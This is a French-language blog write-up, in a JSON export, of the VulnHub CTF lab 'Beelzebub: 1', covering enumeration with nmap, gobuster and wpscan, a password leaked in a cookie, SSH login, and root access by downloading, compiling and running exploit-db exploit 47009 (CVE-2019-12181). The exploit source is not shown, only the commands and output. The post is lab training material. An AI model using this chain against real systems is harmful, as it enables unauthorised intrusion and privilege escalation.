{"hash":"b89929ffb278454bd1f8bb0277abaa50df9b43f7","data":{"post":{"title":"CTF Beelzebub: 1","date":"9 November 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.3</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.31</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir beelzebub1 &amp;&amp; cd beelzebub1</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -sV -sT -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.29 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.29 sur le port <strong>80</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster.txt\n/index.php            <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">271</span><span class=\"token punctuation\">]</span>\n/index.html           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">10918</span><span class=\"token punctuation\">]</span>\n/javascript           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">317</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.31/javascript/<span class=\"token punctuation\">]</span>\n/phpmyadmin           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">317</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.31/phpmyadmin/<span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Sur le fichier \"index.php\", on a le message \"Not Found\" alors que si on regarde dans le code source, on a un indice.</p>\n<div class=\"gridsome-highlight\" data-language=\"back\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-back line-numbers\"><code class=\"language-back\">$ curl -i http://$IP/index.php \nHTTP/1.1 200 OK\n[...]\n&lt;!--My heart was encrypted, &quot;beelzebub&quot; somehow hacked and decoded it.-md5--&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On décode la chaine de caractère \"beelzebub\" en md5.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">echo</span> -n beelzebub <span class=\"token operator\">|</span> md5sum\nd18e1e22becbd915b45e0e655429d487</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Si on tente d'accéder au serveur avec cette chaine de caractères, on a une erreur de redirection 301.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">curl</span> -i http://<span class=\"token variable\">$IP</span>/d18e1e22becbd915b45e0e655429d487\nHTTP/1.1 <span class=\"token number\">301</span> Moved Permanently\n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Intéressant, poursuivons avec un <strong>Gobuster</strong> sur cette URL.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span>/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster2.txt\n/index.php            <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">57718</span><span class=\"token punctuation\">]</span>\n/wp-content           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">350</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-content/<span class=\"token punctuation\">]</span>\n/wp-login.php         <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">5694</span><span class=\"token punctuation\">]</span>                                                                      \n/license.txt          <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">19935</span><span class=\"token punctuation\">]</span>                                                                     \n/wp-includes          <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">351</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-includes/<span class=\"token punctuation\">]</span>\n/readme.html          <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">7368</span><span class=\"token punctuation\">]</span>                                                                       \n/wp-admin             <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">348</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-admin/<span class=\"token punctuation\">]</span>   \n/xmlrpc.php           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">405</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">42</span><span class=\"token punctuation\">]</span> </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Apparement, on est sur un répertoire du CMS <strong>Wordpress</strong>.</p>\n<p>Dans le répertoire \"/d18e1e22becbd915b45e0e655429d487/wp-content/uploads\"/ il y a 2 dossiers, \"2021\" et \"Talk To VALAK\". Dans ce second dossier, on arrive une page Web qui nous demande de saisir un nom. En soumettant le formulaire (bouton \"Say Hi to VALAK\"), on trouve un éventuel mot de passe dans le cookie de la requête POST.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token function\">curl</span> -i -d <span class=\"token string\">'name=john'</span> http://<span class=\"token variable\">$IP</span>/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk%20To%20VALAK/index.php\nSet-Cookie: <span class=\"token assign-left variable\">Password</span><span class=\"token operator\">=</span>M4k3Ad3a1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Il nous manque l'utilisateur de cet éventuel mot de passe.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">wpscan --url http://<span class=\"token variable\">$IP</span>/d18e1e22becbd915b45e0e655429d487 -e u --ignore-main-redirect --force\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> valak\n <span class=\"token operator\">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class=\"token punctuation\">(</span>Aggressive Detection<span class=\"token punctuation\">)</span>\n <span class=\"token operator\">|</span> Confirmed By: Login Error Messages <span class=\"token punctuation\">(</span>Aggressive Detection<span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> krampus\n <span class=\"token operator\">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class=\"token punctuation\">(</span>Aggressive Detection<span class=\"token punctuation\">)</span>\n <span class=\"token operator\">|</span> Confirmed By: Login Error Messages <span class=\"token punctuation\">(</span>Aggressive Detection<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2>Pénétration</h2>\n<p>On arrive à se connecter au serveur avec le second utilisateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> krampus@<span class=\"token variable\">$IP</span>\npassword: M4k3Ad3a1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>Dans le répertoire courant de l'utilisateur, on retrouve un historique des commandes intéressantes dont celle ci-dessous.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token function\">cat</span> .bash_history\n<span class=\"token function\">wget</span> https://www.exploit-db.com/download/47009\n<span class=\"token function\">mv</span> <span class=\"token number\">47009</span> ./exploit.c\ngcc exploit.c -o exploit\n./exploit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Elle nous indique l'exploit à utiliser, \"CVE-2019-12181 : Serv-U FTP Server &#x3C; 15.1.7 - Local Privilege Escalation\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">cd</span> /tmp\n$ <span class=\"token function\">wget</span> https://www.exploit-db.com/download/47009 -O exploit.c\n$ gcc exploit.c -o exploit\n$ ./exploit\n\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>,4<span class=\"token punctuation\">(</span>adm<span class=\"token punctuation\">)</span>,24<span class=\"token punctuation\">(</span>cdrom<span class=\"token punctuation\">)</span>,30<span class=\"token punctuation\">(</span>dip<span class=\"token punctuation\">)</span>,33<span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span>,46<span class=\"token punctuation\">(</span>plugdev<span class=\"token punctuation\">)</span>,116<span class=\"token punctuation\">(</span>lpadmin<span class=\"token punctuation\">)</span>,126<span class=\"token punctuation\">(</span>sambashare<span class=\"token punctuation\">)</span>,1000<span class=\"token punctuation\">(</span>krampus<span class=\"token punctuation\">)</span>\nopening root shell\n<span class=\"token comment\"># id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>,4<span class=\"token punctuation\">(</span>adm<span class=\"token punctuation\">)</span>,24<span class=\"token punctuation\">(</span>cdrom<span class=\"token punctuation\">)</span>,30<span class=\"token punctuation\">(</span>dip<span class=\"token punctuation\">)</span>,33<span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span>,46<span class=\"token punctuation\">(</span>plugdev<span class=\"token punctuation\">)</span>,116<span class=\"token punctuation\">(</span>lpadmin<span class=\"token punctuation\">)</span>,126<span class=\"token punctuation\">(</span>sambashare<span class=\"token punctuation\">)</span>,1000<span class=\"token punctuation\">(</span>krampus<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Et on trouve facilement le flag root.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/root.txt\n8955qpasq8qq807879p75e1rr24cr1a5</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/beelzebub-1,742","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":4,"parts":[]}},"context":{}}